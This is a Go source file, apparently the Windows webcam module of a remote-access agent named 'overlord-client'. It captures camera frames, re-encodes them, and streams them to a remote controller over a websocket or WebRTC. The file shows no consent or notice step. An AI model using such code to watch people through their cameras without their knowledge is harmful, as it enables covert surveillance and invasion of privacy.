//go:build windows && cgo

package capture

import (
	"bytes"
	"context"
	"fmt"
	"image"
	"image/draw"
	"image/jpeg"
	"log"
	"sync"
	"time"

	cam "github.com/Kirizu-Official/windows-camera-go/camera/v1"
	"github.com/Kirizu-Official/windows-camera-go/windows/guid"

	rt "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/webrtcpub"
	"overlord-client/cmd/agent/wire"
)

type webcamState struct {
	deviceIndex int
	device      *cam.Device
	capture     *cam.CaptureSync
	format      string
	captureFPS  float64

	latestMu    sync.Mutex
	latestBytes []byte

	stopCh     chan struct{}
	readerDone chan struct{}
}

func (s *webcamState) startReader() {
	go func() {
		defer close(s.readerDone)
		for {
			select {
			case <-s.stopCh:
				return
			default:
			}

			sample, err := s.capture.GetFrame()
			if err != nil {
				select {
				case <-s.stopCh:
					return
				default:
					time.Sleep(20 * time.Millisecond)
					continue
				}
			}
			if sample == nil || sample.PpSample == nil {
				if sample != nil {
					sample.Release()
				}
				continue
			}

			buffer, err := s.capture.Device.ParseSampleToBuffer(sample.PpSample)
			if err != nil {
				sample.Release()
				select {
				case <-s.stopCh:
					return
				default:
					time.Sleep(20 * time.Millisecond)
					continue
				}
			}
			if buffer == nil {
				sample.Release()
				continue
			}

			frameBytes := make([]byte, int(buffer.Length))
			copy(frameBytes, buffer.Buffer[:buffer.Length])
			buffer.Release()
			sample.Release()

			s.latestMu.Lock()
			s.latestBytes = frameBytes
			s.latestMu.Unlock()
		}
	}()
}

var (
	webcamMu       sync.Mutex
	webcamInitDone bool
	webcamActive   *webcamState
)

func NowWebcam(ctx context.Context, env *rt.Env) error {
	if ctx.Err() != nil {
		return nil
	}

	_, deviceIndex, format, err := ensureWebcamCapture(env.WebcamDeviceIndex)
	if err != nil {
		return err
	}

	webcamMu.Lock()
	state := webcamActive
	webcamMu.Unlock()

	if state == nil {
		return nil
	}

	state.latestMu.Lock()
	frameBytes := state.latestBytes
	state.latestMu.Unlock()

	if frameBytes == nil {
		return nil
	}

	quality := env.WebcamQuality
	codec := env.WebcamCodec
	outFormat := format

	if codec == "h264" && format == "jpeg" && h264Available() {
		img, err := jpeg.Decode(bytes.NewReader(frameBytes))
		if err == nil {
			bounds := img.Bounds()
			w, h := bounds.Dx(), bounds.Dy()
			if w%2 != 0 || h%2 != 0 {
				log.Printf("webcam: h264 skipped for odd dimensions (%dx%d), falling back to jpeg", w, h)
			} else {
				rgba := toRGBA(img)
				if h264Bytes, err := encodeH264Frame(rgba); err == nil && len(h264Bytes) > 0 {
					frameBytes = h264Bytes
					outFormat = "h264"
				} else {
					log.Printf("webcam: h264 encode failed, falling back to jpeg: %v", err)
				}
			}
		}
	}

	if outFormat == "jpeg" && quality > 0 && quality < 100 {
		img, err := jpeg.Decode(bytes.NewReader(frameBytes))
		if err == nil {
			if reencoded, err := encodeJPEG(img, quality); err == nil {
				frameBytes = reencoded
			}
		}
	}

	frame := wire.Frame{
		Type: "frame",
		Header: wire.FrameHeader{
			Monitor: deviceIndex,
			FPS:     0,
			Format:  outFormat,
			Webcam:  true,
		},
		Data: frameBytes,
	}
	if ctx.Err() != nil {
		return nil
	}
	if outFormat == "h264" && webrtcpub.IsActive(webrtcpub.KindWebcam) {
		fps := env.WebcamFPS
		if fps <= 0 {
			fps = 30
		}
		dur := time.Second / time.Duration(fps)
		if dur <= 0 {
			dur = 33 * time.Millisecond
		}
		if werr := webrtcpub.WriteH264(webrtcpub.KindWebcam, frameBytes, dur); werr != nil {
			log.Printf("webrtc: write webcam h264 failed: %v", werr)
		}
		return nil
	}
	// Do not use the stream-cancel context for socket writes; canceling an in-flight
	// write during webcam_stop can tear down the whole websocket on some transports.
	writeCtx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	return wire.WriteMsg(writeCtx, env.Conn, frame)
}

func CleanupWebcam() {
	webcamMu.Lock()
	closeWebcamLocked()
	webcamMu.Unlock()
}

func ensureWebcamCapture(requestedIndex int) (*cam.CaptureSync, int, string, error) {
	webcamMu.Lock()
	defer webcamMu.Unlock()

	if requestedIndex < 0 {
		requestedIndex = 0
	}
	if webcamActive != nil && webcamActive.capture != nil && webcamActive.deviceIndex == requestedIndex {
		return webcamActive.capture, webcamActive.deviceIndex, webcamActive.format, nil
	}

	closeWebcamLocked()

	if !webcamInitDone {
		if err := cam.Init(); err != nil {
			return nil, 0, "", fmt.Errorf("webcam init failed: %w", err)
		}
		webcamInitDone = true
	}

	devices, err := cam.EnumDevice()
	if err != nil {
		return nil, 0, "", fmt.Errorf("webcam enumerate failed: %w", err)
	}
	if len(devices) == 0 {
		return nil, 0, "", fmt.Errorf("no webcam devices detected")
	}
	if requestedIndex >= len(devices) {
		requestedIndex = 0
	}

	deviceInfo := devices[requestedIndex]
	device, err := cam.OpenDevice(deviceInfo.SymbolLink)
	if err != nil {
		return nil, 0, "", fmt.Errorf("open webcam failed: %w", err)
	}

	formats, err := device.EnumerateCaptureFormats()
	if err != nil {
		device.CloseDevice()
		return nil, 0, "", fmt.Errorf("enumerate webcam formats failed: %w", err)
	}
	if len(formats) == 0 {
		device.CloseDevice()
		return nil, 0, "", fmt.Errorf("no webcam capture formats available")
	}
	selected, selectedFormat := selectWebcamFormat(formats)
	if selected == nil {
		device.CloseDevice()
		return nil, 0, "", fmt.Errorf("no JPEG/H264 webcam format available")
	}
	capture, err := device.StartCapture(selected)
	if err != nil {
		device.CloseDevice()
		return nil, 0, "", fmt.Errorf("start webcam capture failed: %w", err)
	}

	webcamActive = &webcamState{
		deviceIndex: requestedIndex,
		device:      device,
		capture:     capture,
		format:      selectedFormat,
		captureFPS:  selected.Fps,
		stopCh:      make(chan struct{}),
		readerDone:  make(chan struct{}),
	}
	webcamActive.startReader()
	log.Printf("webcam: selected device=%q index=%d format=%s %dx%d@%.2ffps", deviceInfo.Name, requestedIndex, selectedFormat, selected.Width, selected.Height, selected.Fps)
	return capture, requestedIndex, selectedFormat, nil
}

func selectWebcamFormat(formats []*cam.CaptureFormats) (*cam.CaptureFormats, string) {
	var best *cam.CaptureFormats
	bestScore := -1.0
	bestFormat := ""
	for _, format := range formats {
		streamFormat := ""
		if isJPEGSubtype(format) {
			streamFormat = "jpeg"
		} else if isH264Subtype(format) {
			streamFormat = "h264"
		}
		if streamFormat == "" {
			continue
		}
		score := formatScore(format)
		if streamFormat == "jpeg" {
			score += 100_000_000
		}
		if streamFormat == "h264" && !format.IsCompressedFormat {
			// Prefer compressed H264 camera output where available.
			score -= 10_000_000
		}
		if score > bestScore {
			best = format
			bestScore = score
			bestFormat = streamFormat
		}
	}
	return best, bestFormat
}

func isJPEGSubtype(format *cam.CaptureFormats) bool {
	if format == nil || format.SubType == nil {
		return false
	}
	return format.SubType.IsMatch(&guid.SubTypeMediaSubTypeMJPG) ||
		format.SubType.IsMatch(&guid.SubTypeMediaSubTypeIJPG)
}

func isH264Subtype(format *cam.CaptureFormats) bool {
	if format == nil || format.SubType == nil {
		return false
	}
	return format.SubType.IsMatch(&guid.SubTypeMediaSubTypeH264)
}

func formatScore(format *cam.CaptureFormats) float64 {
	if format == nil {
		return -1
	}
	score := float64(format.Width*format.Height) + format.Fps*1000
	if format.IsCompressedFormat {
		score += 5_000_000
	}
	if isJPEGSubtype(format) {
		score += 10_000_000
	}
	if format.MajorType != nil && (*format.MajorType).IsMatch(&guid.MajorTypeVideo) {
		score += 1_000_000
	}
	return score
}

func resetWebcamState() {
	webcamMu.Lock()
	defer webcamMu.Unlock()
	closeWebcamLocked()
}

func closeWebcamLocked() {
	if webcamActive != nil {
		close(webcamActive.stopCh)
		webcamActive.device.CloseDevice()
		readerDone := webcamActive.readerDone
		webcamActive = nil

		select {
		case <-readerDone:
		case <-time.After(500 * time.Millisecond):
		}
	}
}

func toRGBA(img image.Image) *image.RGBA {
	if rgba, ok := img.(*image.RGBA); ok {
		return rgba
	}
	b := img.Bounds()
	rgba := image.NewRGBA(b)
	draw.Draw(rgba, b, img, b.Min, draw.Src)
	return rgba
}
